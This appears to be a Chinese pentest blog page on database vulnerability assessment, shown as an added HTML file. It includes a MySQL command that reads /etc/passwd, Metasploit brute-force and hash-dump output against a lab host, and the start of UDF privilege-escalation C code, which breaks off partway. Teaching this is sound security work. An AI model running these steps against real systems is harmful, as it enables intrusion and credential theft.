@@ -1,0 +1,1017 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <title>
+        
+        漏洞评估-2 · \xeb\xfe&#39;s Blog
+        
+    </title>
+    <link rel="icon" href= /assests/favicon.ico>
+    <!-- TODO: 在font-face加载完毕后改变字体  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
+<script>
+hljs.initHighlightingOnLoad();
+$('pre code').each(function(i, block) {
+  //hljs.highlightBlock(block);
+  var lines = $(this).text().split('\n').length - 1;
+  var $numbering = $('<ul/>').addClass('pre-numbering');
+  $(this)
+    .addClass('has-numbering')
+    .parent()
+    .append($numbering);
+  for(i=1;i<=lines;i++){
+    $numbering.append($('<li/>').text(i));
+  }
+});
+</script>
+<style>
+code.has-numbering {
+  margin-left: 10px;
+  word-wrap: normal;
+  word-break: keep-all;
+  white-space: pre;
+}
+
+.pre-numbering {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 20px;
+  height: 100%;
+  padding: .5em 0.2em .5em 0;
+  border-right: 1px solid #C3CCD0;
+  border-radius: 3px 0 0 3px;
+  background-color: #EEE;
+  text-align: right;
+  font-size: 1.0em;
+  color: #AAA;
+  list-style: none;
+}
+@media (max-width: 767px) {
+  .pre-numbering {
+    display: none;
+  }
+  .has-numbering {
+    margin-left: -10px !important;
+    word-wrap: break-world !important;
+    white-space: pre-wrap !important;
+  }
+}
+overflow-x: auto;
+overflow-y: auto;
+word-break: keep-all;
+white-space: pre;
+</style>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.12.0/build/styles/default.min.css">
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.12.0/build/highlight.min.js"></script>
+    <!-- 提前加载place holder  -->
+    <style type="text/css">
+        @font-face {
+            font-family: 'Oswald-Regular';
+            src: url(/font/Oswald-Regular.ttf);
+        }
+    </style>
+    <style type="text/css">
+        .site-intro-placeholder {
+            position: absolute;
+            z-index: -2;
+            top: 0;
+            left: 0px;
+            width: calc(100% + 300px);
+            height: 100%;
+            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+            background-position: center center;
+            transform: translate3d(-226px, 0, 0);
+            animation: gradient-move 2.5s ease-out 0s 1;
+        }
+        @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+    <link rel="stylesheet" href = /css/style.css?v=20171020 />
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    
+    <script src="/scripts/main.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >\xeb\xfe&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">漏洞评估-2</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>\xeb\xfe's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(http://oumn0o088.bkt.clouddn.com/post-bg.jpg)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            漏洞评估-2
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = 漏洞评估>漏洞评估</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2017/12/15</span>
+            </div>
+        
+    </div>
+</div>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <script>
+            var browser = {
+                    versions: function () {
+                        var u = window.navigator.userAgent;
+                        return {
+                            userAgent: u,
+                            trident: u.indexOf('Trident') > -1, //IE内核
+                            presto: u.indexOf('Presto') > -1, //opera内核
+                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+                            iPad: u.indexOf('iPad') > -1, //是否为iPad
+                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+                        };
+                    }()
+                }
+
+            function fontLoaded(){
+                console.log('font loaded');
+                if (document.getElementsByClassName('site-intro-meta')) {
+                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+                        if (postIntroTags) {
+                            postIntroTags.classList.add('post-fade-in');
+                        }
+                        if (postIntroMeat) {
+                            postIntroMeat.classList.add('post-fade-in');
+                        }
+                    }
+                }
+                
+            console.log("userAgent:" + browser.versions.userAgent);
+            // UC不支持跨域，所以直接显示
+            if (browser.versions.uc) {
+                console.log("UCBrowser");
+                fontLoaded();
+            } else {
+                WebFont.load({
+                    custom: {
+                        families: ['Oswald-Regular']
+                    },
+                    loading: function () {  //所有字体开始加载
+                        // console.log('loading');
+                    },
+                    active: function () {  //所有字体已渲染
+                        fontLoaded();
+                    },
+                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+                        console.log('inactive: timeout');
+                        fontLoaded();
+                    },
+                    timeout: 7000 // Set the timeout to two seconds
+                });
+            }
+        </script>
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h1><p>确定了最可行的攻击方法之后，您需要考虑如何访问目标。在脆弱性分析过程中，您可以结合前一阶段学到的信息，并用它来了解哪些攻击是可行的。其中，漏洞分析考虑了端口和漏洞扫描，通过抓取banner收集的数据以及收集情报期间收集的信息。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><strong>评估分类</strong></th>
+<th style="text-align:left"><strong>书签</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">网络评估</td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">Web应用程序评估</td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">数据库评估</td>
+</tr>
+</tbody>
+</table>
+<h2 id="数据库评估"><a href="#数据库评估" class="headerlink" title="数据库评估"></a>数据库评估</h2><h3 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 介绍和Labs安装.</span><br><span class="line">   <span class="number">1.1</span> 什么是MongoDB ?</span><br><span class="line">   <span class="number">1.2</span> 安全性如何 ?</span><br><span class="line">   <span class="number">1.3</span> 在Kali中安装MongoDB</span><br><span class="line">   <span class="number">1.4</span> 玩Mongo Shell </span><br><span class="line">       <span class="number">1.4</span><span class="number">.1</span> 创建数据库</span><br><span class="line">       <span class="number">1.4</span><span class="number">.2</span> 检查当前数据库</span><br><span class="line">       <span class="number">1.4</span><span class="number">.3</span> 检查数据库列表</span><br><span class="line">       <span class="number">1.4</span><span class="number">.4</span> 将数据插入集合</span><br><span class="line">       <span class="number">1.4</span><span class="number">.5</span> 查询数据</span><br><span class="line">       <span class="number">1.4</span><span class="number">.6</span> 在查询数据时写入条件</span><br><span class="line">       <span class="number">1.4</span><span class="number">.7</span> 删除数据</span><br><span class="line">       <span class="number">1.4</span><span class="number">.8</span> 删除文件</span><br><span class="line">       <span class="number">1.4</span><span class="number">.9</span> 删除一个集合</span><br><span class="line">   <span class="number">1.5</span> Lab 安装</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 漏洞评估</span><br><span class="line">   <span class="number">2.1</span> 介绍</span><br><span class="line">   <span class="number">2.2</span> 扫描开放端口</span><br><span class="line">   <span class="number">2.3</span> 服务枚举</span><br><span class="line">   <span class="number">2.4</span> 扫描HTTP接口</span><br><span class="line">   <span class="number">2.5</span> 访问HTTP接口</span><br><span class="line">   <span class="number">2.6</span> 用nmap NSE scripts进行扫描</span><br><span class="line">   <span class="number">2.7</span> mongodb爆破</span><br><span class="line">   <span class="number">2.8</span> mongodb数据库</span><br><span class="line">   <span class="number">2.9</span> Metasploit辅助模块</span><br><span class="line">   <span class="number">2.10</span> 攻击利用</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 攻击应用程序</span><br><span class="line">   <span class="number">3.1</span> 介绍</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> 自动化评估</span><br><span class="line">   <span class="number">4.1</span> 准备好NoSQLMap</span><br><span class="line">   <span class="number">4.2</span> NoSQL DB访问攻击</span><br><span class="line">   <span class="number">4.3</span> 匿名MongoDB访问扫描</span><br><span class="line">   <span class="number">4.4</span> 使用NoSQLmap进行NoSQL注入</span><br></pre></td></tr></table></figure>
+<hr>
+<p>[未汉化pdf和Labs] 链接:  <a href="https://pan.baidu.com/s/1miMhRTI" target="_blank" rel="noopener">https://pan.baidu.com/s/1miMhRTI</a> 密码: hAha</p>
+<p>[NoSQLMap]工具链接：<a href="http://github.com/tcstool/nosqlmap" target="_blank" rel="noopener">http://github.com/tcstool/nosqlmap</a></p>
+<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><table>
+<thead>
+<tr>
+<th style="text-align:left"><strong>命令</strong></th>
+<th style="text-align:left"><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">select @@version</td>
+<td style="text-align:left">显示mysql服务器版本</td>
+</tr>
+<tr>
+<td style="text-align:left">select version()</td>
+<td style="text-align:left">显示mysql服务器版本</td>
+</tr>
+<tr>
+<td style="text-align:left">SHOW STATUS</td>
+<td style="text-align:left">显示mysql服务器状态信息</td>
+</tr>
+<tr>
+<td style="text-align:left">show VARIABLES</td>
+<td style="text-align:left">显示所有的mysql服务器变量</td>
+</tr>
+<tr>
+<td style="text-align:left">select user()</td>
+<td style="text-align:left">查询当前数据库用户</td>
+</tr>
+<tr>
+<td style="text-align:left">SHOW VARIABLES LIKE ‘%datadir%’</td>
+<td style="text-align:left">显示包含数据字符串的所有变量</td>
+</tr>
+<tr>
+<td style="text-align:left">select load_file(‘/etc/passwd’);</td>
+<td style="text-align:left">加载文件到数据库中</td>
+</tr>
+<tr>
+<td style="text-align:left">select 0xnnnnnn… INTO <strong>OUTFILE</strong> ‘/path/to/filename’</td>
+<td style="text-align:left">将数据写入文本文件.</td>
+</tr>
+<tr>
+<td style="text-align:left">select 0xnnnnnn… INTO <strong>DUMPFILE</strong> ‘/path/to/filename’</td>
+<td style="text-align:left">将数据写入二进制文件.</td>
+</tr>
+</tbody>
+</table>
+<p>####怎样安装mysql数据库服务器 ?####</p>
+<p>Lab: ubuntu / debian</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install mysql-server</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl start service</span></span><br></pre></td></tr></table></figure>
+<p>编辑 <code>/etc/mysql/mysql.conf.d/mysqld.cnf</code>, 和改变 <strong>绑定的地址</strong>.</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind-address = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
+<p>####允许远程访问####</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@sh:~<span class="comment"># ss -ant | grep ":3306"</span></span><br><span class="line">LISTEN     <span class="number">0</span>      <span class="number">80</span>           *:<span class="number">3306</span>                     *:*</span><br><span class="line">root@sh:~<span class="comment"># mysql -h 10.0.250.71 -uroot -p</span></span><br><span class="line">Enter password:</span><br><span class="line">ERROR <span class="number">1130</span> (HY000): Host <span class="string">'10.0.250.71'</span> <span class="keyword">is</span> <span class="keyword">not</span> allowed <span class="keyword">to</span> connect <span class="keyword">to</span> <span class="keyword">this</span> MySQL server</span><br></pre></td></tr></table></figure>
+<p>创建一个SQL文件 <strong>adduser.sql</strong>, 和执行这个命令: <code>mysql -h 127.0.0.1 -u root -p mysql &lt; adduser.sql</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'mysqlsec'</span>@<span class="string">'localhost'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'password'</span>;</span><br><span class="line"><span class="keyword">GRANT</span> ALL <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">'mysqlsec'</span>@<span class="string">'localhost'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'mysqlsec'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'password'</span>;</span><br><span class="line"><span class="keyword">GRANT</span> ALL <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">'mysqlsec'</span>@<span class="string">'%'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br></pre></td></tr></table></figure>
+<p>如果成功了，你就能够远程访问MYSQL数据库服务器.</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@sh:~<span class="comment"># mysql -h 10.0.250.71 -u mysqlsec -p mysql</span></span><br><span class="line">Enter password:</span><br><span class="line">Reading table information <span class="keyword">for</span> completion <span class="keyword">of</span> table <span class="keyword">and</span> column names</span><br><span class="line">You can turn off this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line">Welcome <span class="keyword">to</span> <span class="keyword">the</span> MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; <span class="keyword">or</span> \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> <span class="keyword">is</span> <span class="number">8</span></span><br><span class="line">Server <span class="built_in">version</span>: <span class="number">5.6</span><span class="number">.30</span><span class="number">-1</span> (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">2000</span>, <span class="number">2016</span>, Oracle <span class="keyword">and</span>/<span class="keyword">or</span> <span class="keyword">its</span> affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle <span class="keyword">is</span> a registered trademark <span class="keyword">of</span> Oracle Corporation <span class="keyword">and</span>/<span class="keyword">or</span> <span class="keyword">its</span></span><br><span class="line">affiliates. Other names may be trademarks <span class="keyword">of</span> their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type 'help;' <span class="keyword">or</span> '\h' <span class="keyword">for</span> help. Type '\c' <span class="keyword">to</span> clear <span class="keyword">the</span> current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br><span class="line">mysql&gt; select Host,User,Password <span class="keyword">from</span> `mysql`.`user` <span class="keyword">where</span> User='mysqlsec';</span><br><span class="line">+<span class="comment">-----------+----------+-------------------------------------------+</span></span><br><span class="line">| Host      | User     | Password                                  |</span><br><span class="line">+<span class="comment">-----------+----------+-------------------------------------------+</span></span><br><span class="line">| localhost | mysqlsec | *<span class="number">2470</span>C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |</span><br><span class="line">| %         | mysqlsec | *<span class="number">2470</span>C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |</span><br><span class="line">+<span class="comment">-----------+----------+-------------------------------------------+</span></span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+<p>####怎样爆破mysql ?####</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(mysql_login) &gt; show <span class="keyword">options</span></span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/mysql/mysql_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting  Required  Description</span><br><span class="line">   ----              ---------------  --------  -----------</span><br><span class="line">   BLANK_PASSWORDS   false            <span class="keyword">no</span>        Try blank passwords <span class="keyword">for</span> <span class="keyword">all</span> users</span><br><span class="line">   BRUTEFORCE_SPEED  <span class="number">5</span>                yes       How fast <span class="keyword">to</span> bruteforce, from <span class="number">0</span> <span class="keyword">to</span> <span class="number">5</span></span><br><span class="line">   DB_ALL_CREDS      false            <span class="keyword">no</span>        Try each user/password couple stored in the current database</span><br><span class="line">   DB_ALL_PASS       false            <span class="keyword">no</span>        Add <span class="keyword">all</span> passwords in the current database <span class="keyword">to</span> the <span class="keyword">list</span></span><br><span class="line">   DB_ALL_USERS      false            <span class="keyword">no</span>        Add <span class="keyword">all</span> users in the current database <span class="keyword">to</span> the <span class="keyword">list</span></span><br><span class="line">   PASSWORD                           <span class="keyword">no</span>        A specific password <span class="keyword">to</span> authenticate with</span><br><span class="line">   PASS_FILE         /tmp/pass.txt    <span class="keyword">no</span>        File containing passwords, one per <span class="built_in">line</span></span><br><span class="line">   Proxies                            <span class="keyword">no</span>        A proxy chain of format <span class="built_in">type</span>:hos<span class="variable">t:port</span>[,<span class="built_in">type</span>:hos<span class="variable">t:port</span>][...]</span><br><span class="line">   RHOSTS            <span class="number">10.0</span>.<span class="number">250.71</span>      yes       The target address <span class="built_in">range</span> <span class="built_in">or</span> CIDR identifier</span><br><span class="line">   RPORT             <span class="number">3306</span>             yes       The target port</span><br><span class="line">   STOP_ON_SUCCESS   true             yes       Stop guessing when <span class="keyword">a</span> credential works <span class="keyword">for</span> <span class="keyword">a</span> host</span><br><span class="line">   THREADS           <span class="number">10</span>               yes       The <span class="keyword">number</span> of concurrent threads</span><br><span class="line">   USERNAME          mysqlsec         <span class="keyword">no</span>        A specific username <span class="keyword">to</span> authenticate <span class="keyword">as</span></span><br><span class="line">   USERPASS_FILE                      <span class="keyword">no</span>        File containing users <span class="built_in">and</span> passwords separated by space, one pair per <span class="built_in">line</span></span><br><span class="line">   USER_AS_PASS      false            <span class="keyword">no</span>        Try the username <span class="keyword">as</span> the password <span class="keyword">for</span> <span class="keyword">all</span> users</span><br><span class="line">   USER_FILE                          <span class="keyword">no</span>        File containing usernames, one per <span class="built_in">line</span></span><br><span class="line">   VERBOSE           true             yes       Whether <span class="keyword">to</span> <span class="keyword">print</span> output <span class="keyword">for</span> <span class="keyword">all</span> attempts</span><br><span class="line"></span><br><span class="line">msf auxiliary(mysql_login) &gt; run</span><br><span class="line"></span><br><span class="line">[*] <span class="number">10.0</span>.<span class="number">250.71</span>:<span class="number">3306</span>      - <span class="number">10.0</span>.<span class="number">250.71</span>:<span class="number">3306</span> - Found remote MySQL <span class="keyword">version</span> <span class="number">5.6</span>.<span class="number">30</span></span><br><span class="line">[-] <span class="number">10.0</span>.<span class="number">250.71</span>:<span class="number">3306</span>      - <span class="number">10.0</span>.<span class="number">250.71</span>:<span class="number">3306</span> - LOGIN FAILED: mysqlsec:AzVJmX (Incorrec<span class="variable">t:</span> Access denied <span class="keyword">for</span> user <span class="string">'mysqlsec'</span>@<span class="string">'10.0.250.67'</span> (using password: YES))</span><br><span class="line">[-] <span class="number">10.0</span>.<span class="number">250.71</span>:<span class="number">3306</span>      - <span class="number">10.0</span>.<span class="number">250.71</span>:<span class="number">3306</span> - LOGIN FAILED: mysqlsec:j1Uyj3 (Incorrec<span class="variable">t:</span> Access denied <span class="keyword">for</span> user <span class="string">'mysqlsec'</span>@<span class="string">'10.0.250.67'</span> (using password: YES))</span><br><span class="line">[-] <span class="number">10.0</span>.<span class="number">250.71</span>:<span class="number">3306</span>      - <span class="number">10.0</span>.<span class="number">250.71</span>:<span class="number">3306</span> - LOGIN FAILED: mysqlsec:root (Incorrec<span class="variable">t:</span> Access denied <span class="keyword">for</span> user <span class="string">'mysqlsec'</span>@<span class="string">'10.0.250.67'</span> (using password: YES))</span><br><span class="line">[-] <span class="number">10.0</span>.<span class="number">250.71</span>:<span class="number">3306</span>      - <span class="number">10.0</span>.<span class="number">250.71</span>:<span class="number">3306</span> - LOGIN FAILED: mysqlsec:mysql (Incorrec<span class="variable">t:</span> Access denied <span class="keyword">for</span> user <span class="string">'mysqlsec'</span>@<span class="string">'10.0.250.67'</span> (using password: YES))</span><br><span class="line">[+] <span class="number">10.0</span>.<span class="number">250.71</span>:<span class="number">3306</span>      - MYSQL - Succes<span class="variable">s:</span> <span class="string">'mysqlsec:password'</span></span><br><span class="line">[*] Scanned <span class="number">1</span> of <span class="number">1</span> hosts (<span class="number">100</span>% <span class="built_in">complete</span>)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+<p>####怎样把mysql哈希值dump出来 ?####</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(mysql_hashdump) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/mysql/mysql_hashdump):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD  password         <span class="literal">no</span>        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   RHOSTS    10.0.250.71      <span class="literal">yes</span>       The target<span class="built_in"> address </span>range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT     3306             <span class="literal">yes</span>       The target port</span><br><span class="line">   THREADS   1                <span class="literal">yes</span>       The number of concurrent threads</span><br><span class="line">   USERNAME  mysqlsec         <span class="literal">no</span>        The username <span class="keyword">to</span> authenticate as</span><br><span class="line"></span><br><span class="line">msf auxiliary(mysql_hashdump) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 10.0.250.71:3306      - Saving HashString as Loot: root:<span class="number">*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19</span></span><br><span class="line">[+] 10.0.250.71:3306      - Saving HashString as Loot: root:<span class="number">*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19</span></span><br><span class="line">[+] 10.0.250.71:3306      - Saving HashString as Loot: root:<span class="number">*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19</span></span><br><span class="line">[+] 10.0.250.71:3306      - Saving HashString as Loot: root:<span class="number">*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19</span></span><br><span class="line">[+] 10.0.250.71:3306      - Saving HashString as Loot: debian-sys-maint:<span class="number">*8E970943FBFAA7CF6A11A55677E8050B725D9919</span></span><br><span class="line">[+] 10.0.250.71:3306      - Saving HashString as Loot: phpmyadmin:<span class="number">*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19</span></span><br><span class="line">[+] 10.0.250.71:3306      - Saving HashString as Loot: freepbxuser:<span class="number">*433D16EECA646A6CCF8F024AD8CDDC070C6791C1</span></span><br><span class="line">[+] 10.0.250.71:3306      - Saving HashString as Loot: mysqlsec:<span class="number">*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19</span></span><br><span class="line">[+] 10.0.250.71:3306      - Saving HashString as Loot: mysqlsec:<span class="number">*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19</span></span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+<p>####UDF权限提升####</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> Item_result &#123;STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">st_udf_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        arg_count;  <span class="comment">// number of arguments</span></span><br><span class="line">    <span class="keyword">enum</span> Item_result    *arg_type;  <span class="comment">// pointer to item_result</span></span><br><span class="line">    <span class="keyword">char</span>            **args;     <span class="comment">// pointer to arguments</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>       *lengths;   <span class="comment">// length of string args</span></span><br><span class="line">    <span class="keyword">char</span>            *maybe_null;    <span 